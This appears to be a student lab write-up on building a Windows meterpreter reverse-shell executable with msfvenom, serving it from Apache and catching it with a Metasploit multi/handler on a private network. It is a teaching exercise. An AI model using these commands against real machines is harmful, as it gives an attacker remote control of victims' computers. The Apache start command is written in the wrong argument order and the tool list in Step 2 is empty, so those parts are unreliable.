# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
<img width="905" height="718" alt="image" src="https://github.com/user-attachments/assets/7e61d3bf-cf16-4a3f-a488-0a43c4cfcc34" />



Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="903" height="712" alt="image" src="https://github.com/user-attachments/assets/e1a78055-073f-40b6-809a-3e118148e314" />


copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
<img width="900" height="667" alt="image" src="https://github.com/user-attachments/assets/eb7ee8ed-424c-48e4-aba0-ecc17c1eb7aa" />


Start apache server
sudo systemctl apache2 start
## OUTPUT:

<img width="896" height="640" alt="image" src="https://github.com/user-attachments/assets/b138d436-959a-44fc-a9e4-1f0941360863" />

Check the status of apache2
## OUTPUT:
<img width="886" height="687" alt="image" src="https://github.com/user-attachments/assets/55bb79a1-e55d-4d00-a706-1e8538f15b1c" />



Invoke msfconsole:
## OUTPUT:

<img width="888" height="686" alt="image" src="https://github.com/user-attachments/assets/33810bfa-477e-42d6-8052-f50b2039dc73" />



Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:



Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:
<img width="992" height="821" alt="image" src="https://github.com/user-attachments/assets/c2954c41-36c9-48f0-b3cf-fd84fd90a10a" />




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:

<img width="1032" height="575" alt="image" src="https://github.com/user-attachments/assets/56b74c03-2dd0-4277-9759-69530b52f94a" />



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
